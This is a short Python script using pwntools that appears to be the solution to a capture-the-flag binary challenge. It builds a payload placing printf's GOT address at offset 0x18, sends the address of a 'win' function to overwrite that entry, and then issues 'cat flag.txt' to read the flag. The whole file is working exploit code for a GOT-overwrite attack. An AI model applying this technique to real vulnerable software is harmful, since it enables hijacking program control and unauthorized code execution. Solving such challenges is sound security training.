import os
os.chdir(os.path.dirname(__file__))

from pwn import ELF

elf = ELF("handout/chal", checksec=False)

data = bytearray([0] * 0x20)
data[0x18:0x20] = elf.symbols["got.printf"].to_bytes(8, "little")

os.write(1, data[:-1])
print(elf.symbols["win"])

print("cat flag.txt")
